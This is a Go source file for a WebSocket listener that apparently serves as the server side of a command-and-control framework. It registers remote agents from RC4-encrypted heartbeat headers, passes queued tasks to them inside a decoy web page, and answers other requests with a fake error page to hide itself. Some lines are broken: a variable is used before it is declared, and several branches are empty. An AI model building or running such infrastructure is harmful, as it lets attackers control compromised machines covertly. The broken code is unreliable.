package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/rc4"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool {
		return true // Allow all origins for the C2 tunnel
	},
}

func parseRequestHeaderRules(raw string) [][2]string {
	raw = strings.ReplaceAll(raw, "\r\n", "\n")
	var rules [][2]string
	for _, line := range strings.Split(raw, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		idx := strings.IndexByte(line, ':')
		if idx < 0 {
			continue
		}
		name := strings.TrimSpace(line[:idx])
		value := strings.TrimSpace(line[idx+1:])
		if name == "" {
			continue
		}
		rules = append(rules, [2]string{name, value})
	}
	return rules
}

func hostHeaderMatches(requestHost, configHH string) bool {
	configHH = strings.TrimSpace(configHH)
	if configHH == "" {
		return false
	}
	if strings.EqualFold(requestHost, configHH) {
		return true
	}
	if _, _, err := net.SplitHostPort(configHH); err == nil {
		return false
	}
	reqHost, _, err := net.SplitHostPort(requestHost)
	if err != nil {
		return false
	}
	return strings.EqualFold(reqHost, configHH)
}

func requestHeadersMatch(req *http.Request, raw string) bool {
	rules := parseRequestHeaderRules(raw)
	if len(rules) == 0 {
		return true
	}
	for _, kv := range rules {
		if req.Header.Get(kv[0]) != kv[1] {
			return false
		}
	}
	return true
}

type Listener struct {
	transport *TransportWS
}

type TransportWS struct {
	GinEngine *gin.Engine
	Server    *http.Server
	Config    TransportConfig
	Name      string
	Active    bool
}

type TransportConfig struct {
	HostBind           string   `json:"host_bind"`
	PortBind           int      `json:"port_bind"`
	Callback_addresses []string `json:"callback_addresses"`
	EncryptKey         string   `json:"encrypt_key"`

	Ssl         bool   `json:"ssl"`
	SslCert     []byte `json:"ssl_cert"`
	SslKey      []byte `json:"ssl_key"`
	SslCertPath string `json:"ssl_cert_path"`
	SslKeyPath  string `json:"ssl_key_path"`

	HttpMethod     string   `json:"http_method"`
	Uri            []string `json:"uri"`
	ParameterName  string   `json:"hb_header"`
	UserAgent      []string `json:"user_agent"`
	HostHeader     []string `json:"host_header"`
	RequestHeaders string   `json:"request_headers"`

	ResponseHeaders    map[string]string `json:"response_headers"`
	TrustXForwardedFor bool              `json:"x-forwarded-for"`
	WebPageError       string            `json:"page-error"`
	WebPageOutput      string            `json:"page-payload"`

	Server_headers string `json:"server_headers"`
	Protocol       string `json:"protocol"`
}

func validConfig(config string) error {
	var conf TransportConfig
	err := json.Unmarshal([]byte(config), &conf)
	if err != nil {
		return err
	}

	if conf.HostBind == "" {
		return errors.New("HostBind is required")
	}
	if conf.PortBind < 1 || conf.PortBind > 65535 {
		return errors.New("PortBind must be in the range 1-65535")
	}
	if len(conf.Callback_addresses) == 0 {
		return errors.New("callback_servers is required")
	}

	for _, uriLine := range conf.Uri {
		uriLine = strings.TrimSpace(uriLine)
		if uriLine == "" {
			continue
		}
		matched, err := regexp.MatchString(`^/[a-zA-Z0-9\.\=\-]+(/[a-zA-Z0-9\.\=\-]+)*$`, uriLine)
		if err != nil || !matched {
			return fmt.Errorf("uri invalid: %s", uriLine)
		}
	}

	match, _ := regexp.MatchString("^[0-9a-f]{32}$", conf.EncryptKey)
	if len(conf.EncryptKey) != 32 || !match {
		return errors.New("encrypt_key must be 32 hex characters")
	}
	return nil
}

func (t *TransportWS) Start(ts Teamserver) error {
	var err error = nil

	gin.SetMode(gin.ReleaseMode)
	router := gin.New()
	router.NoRoute(t.pageError)

	router.Use(func(c *gin.Context) {
		for header, value := range t.Config.ResponseHeaders {
			c.Header(header, value)
		}
		c.Next()
	})

	router.GET("/*endpoint", t.processRequest)

	t.Active = true
	t.Server = &http.Server{
		Addr:    fmt.Sprintf("%s:%d", t.Config.HostBind, t.Config.PortBind),
		Handler: router,
	}

	if t.Config.Ssl {
		fmt.Printf("   Started listener '%s': wss://%s:%d\n", t.Name, t.Config.HostBind, t.Config.PortBind)
		listenerPath := ListenerDataDir + "/" + t.Name
		_, err = os.Stat(listenerPath)
		if os.IsNotExist(err) {
			err = os.Mkdir(listenerPath, os.ModePerm)
		}
		t.Config.SslCertPath = listenerPath + "/listener.crt"
		t.Config.SslKeyPath = listenerPath + "/listener.key"

		if len(t.Config.SslCert) == 0 || len(t.Config.SslKey) == 0 {
			err = t.generateSelfSignedCert(t.Config.SslCertPath, t.Config.SslKeyPath)
			if err != nil {
				return err
			}
		} else {
			_ = os.WriteFile(t.Config.SslCertPath, t.Config.SslCert, 0600)
			_ = os.WriteFile(t.Config.SslKeyPath, t.Config.SslKey, 0600)
		}

		cert, err := tls.LoadX509KeyPair(t.Config.SslCertPath, t.Config.SslKeyPath)
		if err != nil {
			return err
		}

		t.Server.TLSConfig = &tls.Config{Certificates: []tls.Certificate{cert}}
		t.Server.TLSNextProto = make(map[string]func(*http.Server, *tls.Conn, http.Handler))

		go func() {
			err = t.Server.ListenAndServeTLS("", "")
			if err != nil && !errors.Is(err, http.ErrServerClosed) {
				fmt.Printf("Error starting WSS server: %v\n", err)
			}
		}()
	} else {
		fmt.Printf("   Started listener '%s': ws://%s:%d\n", t.Name, t.Config.HostBind, t.Config.PortBind)
		go func() {
			err = t.Server.ListenAndServe()
			if err != nil && !errors.Is(err, http.ErrServerClosed) {
				fmt.Printf("Error starting WS server: %v\n", err)
			}
		}()
	}
	time.Sleep(500 * time.Millisecond)
	return err
}

func (t *TransportWS) Stop() error {
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	listenerPath := ListenerDataDir + "/" + t.Name
	if _, err := os.Stat(listenerPath); err == nil {
		_ = os.RemoveAll(listenerPath)
	}
	return t.Server.Shutdown(ctx)
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func (t *TransportWS) processRequest(ctx *gin.Context) {
	var ExternalIP string

	u, err := url.Parse(ctx.Request.RequestURI)
	uriValid := false
	if err == nil {
		for _, configUri := range t.Config.Uri {
			configUri = strings.TrimSpace(configUri)
			if configUri != "" && configUri == u.Path {
				uriValid = true
				break
			}
		}
	}
	if !uriValid {
		t.pageError(ctx)
		return
	}

	if t.Config.TrustXForwardedFor && ctx.Request.Header.Get("X-Forwarded-For") != "" {
		ExternalIP = ctx.Request.Header.Get("X-Forwarded-For")
	} else {
		ExternalIP = strings.Split(ctx.Request.RemoteAddr, ":")[0]
	}

	agentType, agentId, beat, err := t.parseBeat(ctx)
	if err != nil {
		t.pageError(ctx)
		return
	}

	if !Ts.TsAgentIsExists(agentId) {
		_, err = Ts.TsAgentCreate(agentType, agentId, beat, t.Name, ExternalIP, true)
		if err != nil {
			t.pageError(ctx)
			return
		}
	}

	_ = Ts.TsAgentSetTick(agentId, t.Name)

	conn, err := upgrader.Upgrade(ctx.Writer, ctx.Request, nil)
	if err != nil {
		return
	}
	defer conn.Close()

	if agentType == "a7f3b902" {
		// Linux WS agent sends an init_msg encrypted with the profile key before
		// entering the session-key loop. Windows beacon sends session-key data
		// immediately, so only skip the Linux init frame.
		_, initData, err := conn.ReadMessage()
		if err != nil {
			return
		}
		_ = initData // discard -- init was already handled in the beat
_ = preSize
	}

	preSize := len(strings.Split(t.Config.WebPageOutput, "<<<PAYLOAD_DATA>>>")[0])

	// WebSocket Ping-Pong Loop
	for {
		msgType, bodyData, err := conn.ReadMessage()
_ = msgType
		if err != nil {
			break
		}


		if len(bodyData) > 0 {
			if err = Ts.TsAgentProcessData(agentId, bodyData); err != nil {
			} else {
			}
		} else {
		}

		// Check for tasks
		responseData, err := Ts.TsAgentGetHostedAll(agentId, 0x1900000)
		if err == nil && len(responseData) > 0 {
			encData := base64.StdEncoding.EncodeToString(responseData)
			finalPayload := strings.Replace(t.Config.WebPageOutput, "<<<PAYLOAD_DATA>>>", encData, 1)
			_ = conn.WriteMessage(websocket.TextMessage, []byte(finalPayload))
		} else {
			if err != nil {
			}
			// Send empty message to unblock client's Receive
			finalPayload := strings.Replace(t.Config.WebPageOutput, "<<<PAYLOAD_DATA>>>", "", 1)
			_ = conn.WriteMessage(websocket.TextMessage, []byte(finalPayload))
		}
		_ = Ts.TsAgentSetTick(agentId, t.Name)
	}
}

func (t *TransportWS) parseBeat(ctx *gin.Context) (string, string, []byte, error) {
	beat := ctx.Request.Header.Get(t.Config.ParameterName); if beat == "" { beat = ctx.Request.Header.Get("X-Beat"); if beat == "" { beat = ctx.Request.Header.Get("Sec-WebSocket-Protocol") } }
	if beat == "" {
		return "", "", nil, errors.New("missing Sec-WebSocket-Protocol header")
	}

	agentInfoCrypt, err := base64.StdEncoding.DecodeString(beat)
	if len(agentInfoCrypt) < 5 || err != nil {
		return "", "", nil, errors.New("failed decode beat")
	}

	encKey, err := hex.DecodeString(t.Config.EncryptKey)
	if err != nil {
		return "", "", nil, errors.New("invalid encrypt_key")
	}
	rc4crypt, errcrypt := rc4.NewCipher(encKey)
	if errcrypt != nil {
		return "", "", nil, errors.New("rc4 error")
	}

	agentInfo := make([]byte, len(agentInfoCrypt))
	rc4crypt.XORKeyStream(agentInfo, agentInfoCrypt)

	agentType := uint(binary.BigEndian.Uint32(agentInfo[:4]))
	agentInfo = agentInfo[4:]
	agentId := uint(binary.BigEndian.Uint32(agentInfo[:4]))
	agentInfo = agentInfo[4:]

	return fmt.Sprintf("%08x", agentType), fmt.Sprintf("%08x", agentId), agentInfo, nil
}

func (t *TransportWS) generateSelfSignedCert(certFile, keyFile string) error {
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return err
	}

	serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
	serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
	if err != nil {
		return err
	}

	template := x509.Certificate{
		SerialNumber:          serialNumber,
		NotBefore:             time.Now(),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	hostBind := strings.TrimSpace(t.Config.HostBind)
	if hostBind == "" || hostBind == "0.0.0.0" {
		template.DNSNames = []string{"localhost"}
		template.IPAddresses = []net.IP{net.ParseIP("127.0.0.1")}
	} else if ip := net.ParseIP(hostBind); ip != nil {
		template.IPAddresses = []net.IP{ip}
	} else {
		template.DNSNames = []string{hostBind}
	}

	certData, err := x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
	if err != nil {
		return err
	}

	var certBuffer, keyBuffer bytes.Buffer
	err = pem.Encode(&certBuffer, &pem.Block{Type: "CERTIFICATE", Bytes: certData})
	if err != nil {
		return err
	}
	t.Config.SslCert = certBuffer.Bytes()
	os.WriteFile(certFile, t.Config.SslCert, 0644)

	keyData := x509.MarshalPKCS1PrivateKey(privateKey)
	err = pem.Encode(&keyBuffer, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: keyData})
	if err != nil {
		return err
	}
	t.Config.SslKey = keyBuffer.Bytes()
	os.WriteFile(keyFile, t.Config.SslKey, 0644)

	return nil
}

func (t *TransportWS) pageError(ctx *gin.Context) {
	ctx.Writer.WriteHeader(http.StatusNotFound)
	html := []byte(t.Config.WebPageError)
	_, _ = ctx.Writer.Write(html)
}
